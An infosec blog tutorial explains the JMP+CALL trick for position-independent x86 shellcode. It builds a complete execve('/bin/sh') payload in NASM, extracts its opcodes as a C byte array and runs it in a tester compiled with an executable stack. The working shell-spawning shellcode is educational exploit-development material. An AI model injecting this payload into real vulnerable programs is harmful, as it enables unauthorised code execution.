<!DOCTYPE html><html lang="en"mode="dark"><!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now"><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Injectable Shellcodes: The ADDRESS Challenge" />
<meta property="og:locale" content="en" />
<meta name="description" content="One challenging aspect of creating a shellcode is dealing with addresses. Your shellcode will often need to reference certain locations, which gets complicated when working in the context of the program you are injecting into. These problems can be solved using a few tricks;" />
<meta property="og:description" content="One challenging aspect of creating a shellcode is dealing with addresses. Your shellcode will often need to reference certain locations, which gets complicated when working in the context of the program you are injecting into. These problems can be solved using a few tricks;" />
<link rel="canonical" href="https://4g3nt47.github.io/posts/shellcoding/shellcoding_addr_chall.html" />
<meta property="og:url" content="https://4g3nt47.github.io/posts/shellcoding/shellcoding_addr_chall.html" />
<meta property="og:site_name" content="4g3nt47" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-05-09T00:00:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Injectable Shellcodes: The ADDRESS Challenge" />
<meta name="twitter:site" content="@UmarAbdoul" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"description":"One challenging aspect of creating a shellcode is dealing with addresses. Your shellcode will often need to reference certain locations, which gets complicated when working in the context of the program you are injecting into. These problems can be solved using a few tricks;","@type":"BlogPosting","url":"https://4g3nt47.github.io/posts/shellcoding/shellcoding_addr_chall.html","headline":"Injectable Shellcodes: The ADDRESS Challenge","dateModified":"2024-05-09T00:00:00+01:00","datePublished":"2024-05-09T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://4g3nt47.github.io/posts/shellcoding/shellcoding_addr_chall.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<title>Injectable Shellcodes: The ADDRESS Challenge | 4g3nt47
  </title><!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
--><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="4g3nt47">
<meta name="application-name" content="4g3nt47">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">
<!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA --><!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/css/all.min.css"><!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet"
    href="/assets/css/bootstrap-toc.min.css"><!-- Manific Popup -->
  <link rel="stylesheet" href="/assets/css/magnific-popup.min.css"><!-- JavaScript -->

  <script src="/assets/js/jquery.min.js"></script>

</head>
<body data-spy="scroll" data-target="#toc"><!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto"><img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"></a>
    </div>

    <div class="site-title mt-3">
      <a href="/">4g3nt47</a>
    </div>
    <div class="site-subtitle font-italic">Welcome to my infosec blog</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs --><li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i><span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i><span>TAGS</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i><span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i><span>ABOUT</span>
      </a>
    </li> <!-- .nav-item --></ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"><a href="https://github.com/4g3nt47" aria-label="github"target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a><a href="https://twitter.com/UmarAbdoul" aria-label="twitter"target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a><a href="javascript:location.href = 'mailto:' + ['aufaruq02','gmail.com'].join('@')" aria-label="email">
        <i class="fas fa-envelope"></i>
      </a><a href="/rss/feed.xml" aria-label="rss">
        <i class="fas fa-rss"></i>
      </a></div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->
<!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb"><span>
            <a href="/">
              Home
            </a>
          </span><span>Injectable Shellcodes: The ADDRESS Challenge</span></span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">Post</div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>
<div id="main-wrapper">
      <div id="main">

        <div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><!--
  Refactor the HTML structure.
--><!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
--><!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
--><!-- Add attribute 'hide-bullet' to the checkbox list --><!-- images --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add header for code snippets --><!-- Create heading anchors --><!-- return -->

<h1 data-toc-skip>Injectable Shellcodes: The ADDRESS Challenge</h1>

<div class="post-meta text-muted">

  <!-- author -->
  <div>By
    <em><a href="https://twitter.com/UmarAbdoul">Umar Abdul</a></em>
  </div>

  <div class="d-flex">
    <div>
      <!-- published date -->
      <span>
        Posted<!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeago"
    date="2024-05-09 00:00:00 +0100"data-toggle="tooltip"
      data-placement="bottom"
      title="Thu, May  9, 2024, 12:00 AM +0100">May  9</em>
</span>

      <!-- lastmod date --><!-- read time --><!--
  Calculate the post's reading time, and display the word count in tooltip
 --><!-- words per minute  --><!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="1824 words">
  <em>10 min</em> read</span>
<!-- page views --></div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>One challenging aspect of creating a shellcode is dealing with addresses. Your shellcode will often need to reference certain locations, which gets complicated when working in the context of the program you are injecting into. These problems can be solved using a few tricks;</p>

<p><br /></p>

<h3 id="the-jmp--call-trick">The JMP + CALL trick<a href="#the-jmp--call-trick" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>One simple way of solving address challenges when writing a shellcode is by taking advantage of how the <code class="language-plaintext highlighter-rouge">JMP</code> and <code class="language-plaintext highlighter-rouge">CALL</code> instructions work. In this approach, relative jumps, which are just jumps that are followed by an offset (number of bytes/opcodes to skip AFTER the current <code class="language-plaintext highlighter-rouge">JMP</code> instruction, basically <code class="language-plaintext highlighter-rouge">EIP + offset</code>) instead of a full address, are used to control the flow of execution in a way that’s independent of the execution context. This allows the shellcode to be injected anywhere without affecting the execution flow. Let’s have a look into how relative jumps work with the following example;</p>

<div class="language-nasm highlighter-rouge"><div class="code-header"><span label-text="Nasm"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nf">section</span> <span class="nv">.text</span>
    <span class="nf">global</span> <span class="nv">_start</span>

<span class="nl">_start:</span>
    <span class="nf">jmp</span> <span class="nv">target</span>
    <span class="nf">nop</span>
    <span class="nf">nop</span>

<span class="nl">target:</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xdead</span>
</pre></td></tr></tbody></table></code></div></div>

<p>When the above code is assembled, the <code class="language-plaintext highlighter-rouge">JMP</code> instruction generated uses an offset to <code class="language-plaintext highlighter-rouge">target</code>, not an address. Notice that there are two <code class="language-plaintext highlighter-rouge">NOP</code> instructions between the <code class="language-plaintext highlighter-rouge">JMP</code> instruction and <code class="language-plaintext highlighter-rouge">target</code>, and each <code class="language-plaintext highlighter-rouge">NOP</code> instruction assembles to 1 byte (<code class="language-plaintext highlighter-rouge">0x90</code>), so our <code class="language-plaintext highlighter-rouge">JMP</code> offset is 2 as we need to skip these bytes (<code class="language-plaintext highlighter-rouge">eb</code> is the <code class="language-plaintext highlighter-rouge">JMP</code> instruction and <code class="language-plaintext highlighter-rouge">02</code> is the offset);</p>

<p><img data-src="/assets/img/Pasted image 20240415133944.png" alt="" data-proofer-ignore></p>

<p>The <code class="language-plaintext highlighter-rouge">CALL</code> instruction, which is used to call functions, works quite similarly to the <code class="language-plaintext highlighter-rouge">JMP</code> instruction with one key difference: <code class="language-plaintext highlighter-rouge">CALL</code> pushes the address of the next instruction (return address) onto the stack before jumping to the target location, while <code class="language-plaintext highlighter-rouge">JMP</code> simply modifies the instruction pointer to go to the target location. Saving the return address allows the called function to hand control back to the caller using the <code class="language-plaintext highlighter-rouge">RET</code> instruction, which simply pops the return address from the stack and jump to it.</p>

<p>These two instructions can help us solve the address challenge when writing shellcodes using the following steps;</p>
<ol>
  <li>Start our shellcode with a short <code class="language-plaintext highlighter-rouge">JMP</code> to a <code class="language-plaintext highlighter-rouge">CALL</code> instruction to setup relative addressing.</li>
  <li><code class="language-plaintext highlighter-rouge">CALL</code> another offset within the same shellcode that contains the main code of our shellcode.</li>
  <li>Read the address stored at the top of the stack by the <code class="language-plaintext highlighter-rouge">CALL</code> instruction. This address will be pointing to a known position near or at the end of the shellcode, and we can use it to dynamically calculate other offsets at runtime.</li>
</ol>

<p>Here is the layout;</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>_start:
  jmp loc1

shellcode:
  ---[ main code]---

loc1:
  call shellcode
  ---[ Your ref point that will be pushed onto the stack ]---
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">_start</code> marks the shellcode’s entrypoint, <code class="language-plaintext highlighter-rouge">shellcode</code> is our main shellcode body, and <code class="language-plaintext highlighter-rouge">loc1</code> is where we make the call to get our reference address onto the stack.</p>

<p>With that in mind, we can write a simple injectable shellcode that uses <code class="language-plaintext highlighter-rouge">execve()</code> syscall to spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell. <code class="language-plaintext highlighter-rouge">execve()</code> is defined in the <code class="language-plaintext highlighter-rouge">unistd.h</code> header file, and is used to execute other programs. The function accepts three arguments;</p>

<pre><code class="language-C">int execve(const char *pathname, char *const argv[], char *const envp[]);
</code></pre>

<ol>
  <li><code class="language-plaintext highlighter-rouge">pathname</code>: This is the full path of the program you want to execute.</li>
  <li><code class="language-plaintext highlighter-rouge">argv[]</code>: An array of strings containing the path of the program, and any other argument to pass to the program. Should be null-terminated.</li>
  <li><code class="language-plaintext highlighter-rouge">envp[]</code>: An array of strings containing any environment variables you wish to pass to the program. Can be null.</li>
</ol>

<p>Since we are working in x86 (32-bit) assembly shellcode, we’ll need to rely on making a direct system call (syscall) to use this function. To do this, we need to;</p>

<ol>
  <li>Set <code class="language-plaintext highlighter-rouge">EAX</code> to <code class="language-plaintext highlighter-rouge">0x0b</code>, which is the code for <code class="language-plaintext highlighter-rouge">execve()</code> syscall.</li>
  <li>Set <code class="language-plaintext highlighter-rouge">EBX</code> to a pointer to a string. This is the <code class="language-plaintext highlighter-rouge">pathname</code> argument.</li>
  <li>Set <code class="language-plaintext highlighter-rouge">ECX</code> to a pointer to an array of pointers. This is the <code class="language-plaintext highlighter-rouge">argv[]</code> argument.</li>
  <li>Set <code class="language-plaintext highlighter-rouge">EDX</code> to a pointer to an array of pointers. This is the <code class="language-plaintext highlighter-rouge">envp[]</code> argument, which can be null.</li>
</ol>

<p>For our <code class="language-plaintext highlighter-rouge">/bin/sh</code> shellcode, we start by creating a basic x86 program (I’m using NASM), and setup the first jump;</p>

<div class="language-nasm highlighter-rouge"><div class="code-header"><span label-text="Nasm"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nf">section</span> <span class="nv">.text</span>
  <span class="nf">global</span> <span class="nv">_start</span>

<span class="nl">_start:</span>
  <span class="nf">jmp</span> <span class="nv">loc1</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Then we define <code class="language-plaintext highlighter-rouge">loc1</code> (our <code class="language-plaintext highlighter-rouge">JMP</code> destination) with the <code class="language-plaintext highlighter-rouge">CALL</code> instruction and the data we are starting with (<code class="language-plaintext highlighter-rouge">/bin/shA</code> where <code class="language-plaintext highlighter-rouge">A</code> is just a placeholder that we will replace with a null at runtime). Note that <code class="language-plaintext highlighter-rouge">db</code> isn’t a typical assembly instruction. The assembler simply embeds the given bytes at that position in the output binary, so the immediate bytes after the opcodes of <code class="language-plaintext highlighter-rouge">call shellcode</code> will be <code class="language-plaintext highlighter-rouge">2f 62 69 6e 2f 73 68 41</code>, which is hex for <code class="language-plaintext highlighter-rouge">/bin/shA</code>;</p>

<div class="language-nasm highlighter-rouge"><div class="code-header"><span label-text="Nasm"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nl">loc1:</span>
  <span class="nf">call</span> <span class="nv">shellcode</span>
  <span class="kd">db</span> <span class="err">"</span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">shA</span><span class="err">"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This block will load the address of <code class="language-plaintext highlighter-rouge">/bin/shA</code> onto the stack, which we can get by de-referencing the pointer in <code class="language-plaintext highlighter-rouge">ESP</code>.</p>

<p>Now for the main shellcode. First thing we need to do is obtain the address to <code class="language-plaintext highlighter-rouge">/bin/shA</code>, null-terminate it, and push it onto the stack. Then move it’s address into <code class="language-plaintext highlighter-rouge">EBX</code> to serve as our <code class="language-plaintext highlighter-rouge">pathname</code>;</p>

<div class="language-nasm highlighter-rouge"><div class="code-header"><span label-text="Nasm"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nl">shellcode:</span>
    <span class="nf">pop</span> <span class="nb">ebx</span>                 <span class="c1">; Get the address of our /bin/shA</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">; For runtime nulling :)</span>
    <span class="nf">push</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">ebx</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span>    <span class="c1">; Push '/shA' into the stack</span>
    <span class="nf">push</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">ebx</span><span class="p">]</span>        <span class="c1">; Push '/bin' into the stack. We now have /bin/shA on top</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mi">7</span><span class="p">],</span> <span class="nb">al</span>  <span class="c1">; Overwrite the 'A' placeholder to null-terminate</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; First arg (filename) of execve() = /bin/sh</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Next we need to setup our <code class="language-plaintext highlighter-rouge">argv[]</code> for the syscall. Since this is just a null-terminated array of string pointers, we can leverage the stack to create it by pushing a NULL to it, followed by the same address we used for <code class="language-plaintext highlighter-rouge">pathname</code>, then save it’s stack address in <code class="language-plaintext highlighter-rouge">ECX</code>;</p>

<div class="language-nasm highlighter-rouge"><div class="code-header"><span label-text="Nasm"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>  <span class="c1">; Build the *argv[] array on the stack</span>
    <span class="nf">push</span> <span class="nb">eax</span>                <span class="c1">; NULL</span>
    <span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; /bin/sh</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; ECX = {"/bin/sh", NULL}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We then set <code class="language-plaintext highlighter-rouge">envp[]</code> to null since we don’t need it;</p>

<div class="language-nasm highlighter-rouge"><div class="code-header"><span label-text="Nasm"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>  <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">; EDX = NULL</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Finally, we execute the syscall;</p>

<div class="language-nasm highlighter-rouge"><div class="code-header"><span label-text="Nasm"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>  <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x0b</span>           <span class="c1">; 0x0b (11) = execve() syscall</span>
  <span class="nf">int</span> <span class="mh">0x80</span>               <span class="c1">; Y33T!!!</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The complete code;</p>

<div class="language-nasm highlighter-rouge"><div class="code-header"><span label-text="Nasm"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="nf">section</span> <span class="nv">.text</span>
    <span class="nf">global</span> <span class="nv">_start</span>

<span class="nl">_start:</span>
    <span class="nf">jmp</span> <span class="nv">loc1</span>

<span class="nl">shellcode:</span>
    <span class="nf">pop</span> <span class="nb">ebx</span>                 <span class="c1">; Get the address of our /bin/shA</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">; For runtime nulling :)</span>
    <span class="nf">push</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">ebx</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span>    <span class="c1">; Push '/shA' into the stack</span>
    <span class="nf">push</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">ebx</span><span class="p">]</span>        <span class="c1">; Push '/bin' into the stack. We now have /bin/shA on top</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mi">7</span><span class="p">],</span> <span class="nb">al</span>  <span class="c1">; Overwrite the 'A' placeholder to null-terminate</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; First arg (filename) of execve() = /bin/sh</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">; EDX = NULL</span>
    
    <span class="c1">; Build the *argv[] array on the stack</span>
    <span class="nf">push</span> <span class="nb">eax</span>                <span class="c1">; NULL</span>
    <span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; /bin/sh</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; ECX = {"/bin/sh", NULL}</span>

    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x0b</span>            <span class="c1">; 0x0b (11) = execve() syscall</span>
  <span class="nf">int</span> <span class="mh">0x80</span>                <span class="c1">; Y33T!!!</span>

<span class="nl">loc1:</span>
  <span class="nf">call</span> <span class="nv">shellcode</span>          <span class="c1">; Jump to main body and save our reference address.</span>
    <span class="kd">db</span> <span class="err">"</span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">shA</span><span class="err">"</span>           <span class="c1">; Our reference address.</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I saved this as <code class="language-plaintext highlighter-rouge">test.asm</code>. Time to assemble and test (Note: I’m working on an x64 system, and building for x86, hence the need to declare architecture in the following commands);</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>nasm -f elf32 test.asm -o test.o
ld -m elf_i386 test.o -o test
</pre></td></tr></tbody></table></code></div></div>

<p><img data-src="/assets/img/Pasted image 20240415184124.png" alt="" data-proofer-ignore></p>

<p>Everything looks good :) But we are running it as a standalone ELF binary. To covert it into a shellcode, we need to extract our opcodes of interest only. Disassembling the binary using <code class="language-plaintext highlighter-rouge">objdump</code> shows that the <code class="language-plaintext highlighter-rouge">.text</code> section holds all our code of interest;</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>objdump -D -Mintel test
</pre></td></tr></tbody></table></code></div></div>

<p><img data-src="/assets/img/Pasted image 20240415184745.png" alt="" data-proofer-ignore></p>

<p>Note that the instructions highlighted in red look weird. These aren’t actual instructions, but rather the bytes we embedded (<code class="language-plaintext highlighter-rouge">/bin/shA</code>) using the <code class="language-plaintext highlighter-rouge">db</code> instruction.</p>

<p>We now need to extract these opcodes. Many ways to go about this, but I personally prefer <code class="language-plaintext highlighter-rouge">objcopy</code> when extracting a whole section;</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>objcopy -O binary --only-section=.text test shellcode.bin
</pre></td></tr></tbody></table></code></div></div>

<p><img data-src="/assets/img/Pasted image 20240415185246.png" alt="" data-proofer-ignore></p>

<p>The file <code class="language-plaintext highlighter-rouge">shellcode.bin</code> contains our raw shellcode. We can use a disassembler to confirm if everything looks good. I use <code class="language-plaintext highlighter-rouge">rasm2</code> (part of <em>Radare2</em>) when dealing with shellcodes;</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>rasm2 -d -B -f shellcode.bin
</pre></td></tr></tbody></table></code></div></div>

<p><img data-src="/assets/img/Pasted image 20240415185925.png" alt="" data-proofer-ignore></p>

<p>Looks good. Now we need check if this shellcode is injectable. We can use a simple C program to test this. First, we need to format this code into a C array. We can achieve this using the <code class="language-plaintext highlighter-rouge">-i</code> option of <code class="language-plaintext highlighter-rouge">xxd</code>;</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>xxd -i shellcode.bin
</pre></td></tr></tbody></table></code></div></div>

<pre><code class="language-C">unsigned char shellcode_bin[] = {
  0xeb, 0x18, 0x5b, 0x31, 0xc0, 0xff, 0x73, 0x04, 0xff, 0x33, 0x88, 0x44,
  0x24, 0x07, 0x89, 0xe3, 0x89, 0xc2, 0x50, 0x53, 0x89, 0xe1, 0xb0, 0x0b,
  0xcd, 0x80, 0xe8, 0xe3, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
  0x73, 0x68, 0x41
};
</code></pre>

<p>We can now write a simple tester for the above shellcode;</p>

<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void main(){
  unsigned char shellcode_bin[] = {
    0xeb, 0x18, 0x5b, 0x31, 0xc0, 0xff, 0x73, 0x04, 0xff, 0x33, 0x88, 0x44,
  0x24, 0x07, 0x89, 0xe3, 0x89, 0xc2, 0x50, 0x53, 0x89, 0xe1, 0xb0, 0x0b,
    0xcd, 0x80, 0xe8, 0xe3, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
    0x73, 0x68, 0x41
  };
  int (*ret)() = (int(*)())shellcode_bin;
  ret();
}
</code></pre>

<p>Compile the program. Make sure you disable NX (non-executable stack) with <code class="language-plaintext highlighter-rouge">-z execstack</code> flag or the program will segfault;</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>gcc tester.c -o tester -m32 -z execstack
</pre></td></tr></tbody></table></code></div></div>

<p>And it worked! We made an x86 injectable shellcode that shows how to use the <code class="language-plaintext highlighter-rouge">JMP + CALL</code> trick to solve addressing issues :)</p>

